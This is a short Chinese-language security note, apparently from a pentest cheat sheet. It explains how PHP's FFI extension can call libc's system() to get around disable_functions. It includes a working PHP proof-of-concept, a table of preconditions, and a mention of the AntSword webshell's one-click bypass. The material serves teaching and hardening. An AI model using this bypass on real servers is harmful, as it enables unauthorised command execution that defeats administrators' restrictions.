## FFI 扩展提权

FFI 的本质是使用 libffi 和 dlopen/dlsym 将系统的 libc 函数绑定到 PHP，从而绕过 PHP 层的限制

即使 PHP 禁用了 `exec()`，攻击者仍可以通过以下流程执行系统命令：

> 利用  `FFI::cdef()` ➜ 声明  `int system(const char *cmd)` ➜ 利用  FFI 找到  libc ➜ 调用  `system()`

**核心利用流程详解**

```php
<?php
// 第一步：构造 C 函数声明
$ffi = FFI::cdef(
    "int system(const char *command);",  // C 语言的函数原型
    "libc.so.6"                           // Linux 系统 libc 动态库
);

// 第二步：调用 system 命令
$ffi->system("id");  // 等同于 system("id");
?>
```

1. `FFI::cdef()` 中声明了 `int system(const char *command);`；
2. `libc.so.6` 是 Linux 下标准 C 函数库，包含了 `system()`；
3. 调用 `$ffi->system("id")` 等同于 PHP 中的 `system("id")`；
4. 即使 `disable_functions=system,exec,passthru`，这段代码仍然成功执行命令

| 条件                     | 说明                                          |
| ------------------------ | --------------------------------------------- |
| PHP ≥ 7.4                | FFI 扩展是从 PHP 7.4 开始引入的               |
| FFI 扩展启用             | `php.ini` 中 `extension=ffi`                  |
| `ffi.enable=true`        | 控制是否允许 FFI 功能（默认生产环境为 false） |
| `disable_functions` 生效 | FFI 是底层调用，不受影响                      |

蚁剑一键梭哈

![](https://pic1.imgdb.cn/item/6881d25e58cb8da5c8d47031.png)
